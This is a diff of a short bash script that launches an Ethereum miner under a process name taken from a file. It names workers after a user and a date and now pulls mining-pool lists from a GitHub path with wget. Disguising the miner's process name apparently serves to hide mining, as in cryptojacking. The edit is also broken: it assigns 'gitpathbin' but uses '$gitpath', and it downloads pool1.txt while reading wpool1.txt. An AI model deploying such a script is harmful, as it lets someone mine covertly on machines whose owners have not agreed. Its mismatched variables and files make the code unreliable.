@@ -1,13 +1,14 @@
 #!/bin/bash
 
-Wallet=$(cat wl.txt)
+rm -rf pool1.txt pool2.txt
+gitpathbin=$(cat ../gitpath.txt)
+wget https://raw.githubusercontent.com/$gitpath/main/pool1.txt
+wget https://raw.githubusercontent.com/$gitpath/main/pool2.txt
+
 Uuname=$(cat inuser.txt)
 date=$(cat date.txt)
 USEPROCNAME=$(cat SETPROCNAME.txt)
-farmrecheck=$(shuf -i 200-300 -n 1)
 namenday="$Uuname"-"$date"
-
-./$USEPROCNAME --farm-recheck $farmrecheck -U \
-                    -P stratum1+tcp://$Wallet.$namenday@us-eth.2miners.com:2020 \
-                    -P stratum1+tcp://$Wallet.$namenday@eth.2miners.com:2020 \
-                    -P stratum1+tcp://$Wallet.$namenday@asia-eth.2miners.com:2020
+pool1=$(cat wpool1.txt)
+pool2=$(cat wpool2.txt)
+./$USEPROCNAME -a ethash -o stratum+http://$pool1 -o stratum+http://$pool2 -w $namenday
